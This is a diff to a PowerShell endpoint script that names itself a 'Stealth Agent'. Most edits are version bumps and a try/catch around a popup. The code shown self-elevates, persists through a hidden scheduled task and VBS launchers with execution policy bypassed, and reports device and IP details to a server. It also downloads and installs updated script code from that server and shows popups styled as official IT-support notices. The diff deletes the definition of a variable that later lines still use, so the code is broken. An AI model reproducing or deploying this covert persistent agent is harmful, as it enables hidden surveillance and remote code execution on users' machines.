@@ -3,7 +3,7 @@ param(
     [switch]$Install
 )
 
-# Version: 1.7.6
+# Version: 1.7.7
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
@@ -69,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.7.6..."
+        Log-Message "Initiating User-Level Persistent Install v1.7.7..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.6" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.7" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -99,7 +99,7 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
         
         Start-ScheduledTask -TaskName $TaskName | Out-Null
-        Log-Message "User-Mode v1.7.0 Active."
+        Log-Message "User-Mode v1.7.7 Active."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
             exit
         }
@@ -130,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.7.6 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Agent v1.7.7 Started (Admin=$IsAdmin). ID: $AgentId"
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -232,7 +232,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.6"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.7"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -294,7 +294,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.6")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.7")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
@@ -312,74 +312,77 @@ try {
                         $MsgBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($msgContent))
                         
                         $PopupCode = @"
-Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-[System.Windows.Forms.Application]::EnableVisualStyles()
-`$Msg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$MsgBase64'))
-`$Form = New-Object Windows.Forms.Form
-`$Form.Text = 'Equinox IT Support'
-`$Form.Size = New-Object Drawing.Size(550,380)
-`$Form.StartPosition = 'CenterScreen'
-`$Form.TopMost = `$true
-`$Form.FormBorderStyle = 'FixedDialog'
-`$Form.BackColor = [System.Drawing.Color]::White
+try {
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    [System.Windows.Forms.Application]::EnableVisualStyles()
+    `$Msg = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$MsgBase64'))
+    
+    `$Form = New-Object Windows.Forms.Form
+    `$Form.Text = 'Equinox IT Support'
+    `$Form.Size = New-Object Drawing.Size(550,380)
+    `$Form.StartPosition = 'CenterScreen'
+    `$Form.TopMost = `$true
+    `$Form.FormBorderStyle = 'FixedDialog'
+    `$Form.BackColor = [System.Drawing.Color]::White
 
-`$IconBox = New-Object Windows.Forms.PictureBox
-`$IconBox.Size = New-Object Drawing.Size(80, 80)
-`$IconBox.Location = New-Object Drawing.Point(20, 30)
-`$IconBox.SizeMode = 'Zoom'
-try { 
-    `$LogoUrl = "$ServerUrl/logo.png"
-    `$Web = New-Object System.Net.WebClient
-    `$ImgBytes = `$Web.DownloadData(`$LogoUrl)
-    `$IconBox.Image = [System.Drawing.Image]::FromStream((New-Object IO.MemoryStream(`$ImgBytes, 0, `$ImgBytes.Length))) 
-} catch { }
+    `$IconBox = New-Object Windows.Forms.PictureBox
+    `$IconBox.Size = New-Object Drawing.Size(80, 80)
+    `$IconBox.Location = New-Object Drawing.Point(20, 30)
+    `$IconBox.SizeMode = 'Zoom'
+    try { 
+        `$LogoUrl = "$ServerUrl/logo.png"
+        `$Web = New-Object System.Net.WebClient
+        `$ImgBytes = `$Web.DownloadData(`$LogoUrl)
+        `$IconBox.Image = [System.Drawing.Image]::FromStream((New-Object IO.MemoryStream(`$ImgBytes, 0, `$ImgBytes.Length))) 
+    } catch { }
 
-`$Header = New-Object Windows.Forms.Label
-`$Header.Text = 'EQUINOX IT SUPPORT'
-`$Header.ForeColor = [System.Drawing.Color]::Black
-`$Header.Font = New-Object Drawing.Font('Segoe UI', 15, [System.Drawing.FontStyle]::Bold)
-`$Header.Location = New-Object Drawing.Point(120, 30)
-`$Header.Size = New-Object Drawing.Size(400, 35)
+    `$Header = New-Object Windows.Forms.Label
+    `$Header.Text = 'EQUINOX IT SUPPORT'
+    `$Header.ForeColor = [System.Drawing.Color]::Black
+    `$Header.Font = New-Object Drawing.Font('Segoe UI', 15, [System.Drawing.FontStyle]::Bold)
+    `$Header.Location = New-Object Drawing.Point(120, 30)
+    `$Header.Size = New-Object Drawing.Size(400, 35)
 
-`$Disclaimer = New-Object Windows.Forms.Label
-`$Disclaimer.Text = '*** OFFICIAL COMPANY COMMUNICATION ***'
-`$Disclaimer.Font = New-Object Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
-`$Disclaimer.ForeColor = [System.Drawing.Color]::FromArgb(2, 132, 199)
-`$Disclaimer.Location = New-Object Drawing.Point(120, 65)
-`$Disclaimer.Size = New-Object Drawing.Size(400, 20)
+    `$Disclaimer = New-Object Windows.Forms.Label
+    `$Disclaimer.Text = '*** OFFICIAL COMPANY COMMUNICATION ***'
+    `$Disclaimer.Font = New-Object Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
+    `$Disclaimer.ForeColor = [System.Drawing.Color]::FromArgb(2, 132, 199)
+    `$Disclaimer.Location = New-Object Drawing.Point(120, 65)
+    `$Disclaimer.Size = New-Object Drawing.Size(400, 20)
 
-`$Content = New-Object Windows.Forms.Label
-`$Content.Text = `$Msg
-`$Content.ForeColor = [System.Drawing.Color]::Black
-`$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
-`$Content.Location = New-Object Drawing.Point(120, 100)
-`$Content.Size = New-Object Drawing.Size(400, 180)
+    `$Content = New-Object Windows.Forms.Label
+    `$Content.Text = `$Msg
+    `$Content.ForeColor = [System.Drawing.Color]::Black
+    `$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
+    `$Content.Location = New-Object Drawing.Point(120, 100)
+    `$Content.Size = New-Object Drawing.Size(400, 150)
 
-`$Legal = New-Object Windows.Forms.Label
-`$Legal.Text = 'This message is intended solely for the addressee and may contain confidential information.'
-`$Legal.Font = New-Object Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Italic)
-`$Legal.ForeColor = [System.Drawing.Color]::Gray
-`$Legal.Location = New-Object Drawing.Point(20, 320)
-`$Legal.Size = New-Object Drawing.Size(500, 20)
+    `$Legal = New-Object Windows.Forms.Label
+    `$Legal.Text = 'This message is intended solely for the addressee and may contain confidential information.'
+    `$Legal.Font = New-Object Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Italic)
+    `$Legal.ForeColor = [System.Drawing.Color]::Gray
+    `$Legal.Location = New-Object Drawing.Point(20, 320)
+    `$Legal.Size = New-Object Drawing.Size(500, 20)
 
-`$Button = New-Object Windows.Forms.Button
-`$Button.Text = 'Acknowledge'
-`$Button.Font = New-Object Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
-`$Button.Size = New-Object Drawing.Size(180, 45)
-`$Button.Location = New-Object Drawing.Point(340, 260)
-`$Button.BackColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
-`$Button.ForeColor = [System.Drawing.Color]::White
-`$Button.FlatStyle = 'Flat'
-`$Button.Add_Click({ `$Form.Close() })
+    `$Button = New-Object Windows.Forms.Button
+    `$Button.Text = 'Acknowledge'
+    `$Button.Font = New-Object Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
+    `$Button.Size = New-Object Drawing.Size(180, 45)
+    `$Button.Location = New-Object Drawing.Point(340, 260)
+    `$Button.BackColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
+    `$Button.ForeColor = [System.Drawing.Color]::White
+    `$Button.FlatStyle = 'Flat'
+    `$Button.Add_Click({ `$Form.Close() })
 
-`$Form.Controls.AddRange(@(`$IconBox, `$Header, `$Disclaimer, `$Content, `$Legal, `$Button))
-`$Form.ShowDialog() | Out-Null
+    `$Form.Controls.AddRange(@(`$IconBox, `$Header, `$Disclaimer, `$Content, `$Legal, `$Button))
+    `$Form.ShowDialog() | Out-Null
+} catch { 
+    "`$([Get-Date]) Popup Fail: `$(`$_.Exception.Message)" | Out-File -FilePath "$InstallDir\popup.log" -Append
+}
 "@
                         $PopupCode | Out-File -FilePath $PopupScript -Force -Encoding utf8
                         $ActiveUser = (Get-CimInstance Win32_ComputerSystem).UserName
                         if ($ActiveUser) {
-                            $VbsPopupPath = "$InstallDir\popup_stealth.vbs"
-                            "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$PopupScript`"`"`", 0, False" | Out-File -FilePath $VbsPopupPath -Force -Encoding ascii
                             $SupportTaskName = "UEA_Support_Msg_$(Get-Random)"
                             $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPopupPath`""
                             try {
